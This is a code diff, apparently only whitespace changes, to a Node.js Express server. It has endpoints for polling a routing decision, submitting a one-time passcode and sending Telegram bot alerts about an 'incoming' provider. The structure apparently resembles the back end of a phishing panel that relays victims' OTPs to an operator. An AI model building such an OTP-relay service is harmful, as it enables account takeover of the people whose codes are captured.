@@ -226,7 +226,7 @@ app.get("/check-decision", (req, res) => {
   res.json({ decision });
   if (decision !== null) {
     setTimeout(() => {
-      routingDecision = null;
+       routingDecision = null;
     }, 6000); // ← increase to 6 seconds to avoid race condition
   }
 });
@@ -247,7 +247,7 @@ app.post("/submit-otp", async (req, res) => {
 
     res.json({ success: true });
   } catch (error) {
-    console.error("Error in /submit-otp:", error);
+     console.error("Error in /submit-otp:", error);
     res.status(500).json({ success: false });
   }
 });
@@ -257,7 +257,7 @@ app.post("/submit-otp", async (req, res) => {
 // ─────────────────────────────────────────────
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+   console.log(`Server running on port ${PORT}`);
 });
 
 
@@ -267,7 +267,7 @@ app.listen(PORT, () => {
 // ─────────────────────────────────────────────
 app.post("/notify-incoming", async (req, res) => {
   try {
-    const { provider } = req.body;
+     const { provider } = req.body;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -279,9 +279,9 @@ app.post("/notify-incoming", async (req, res) => {
       }),
     });
 
-    res.json({ success: true });
+     res.json({ success: true });
   } catch (error) {
     console.error("Error in /notify-incoming:", error);
-    res.status(500).json({ success: false });
+     res.status(500).json({ success: false });
   }
 });
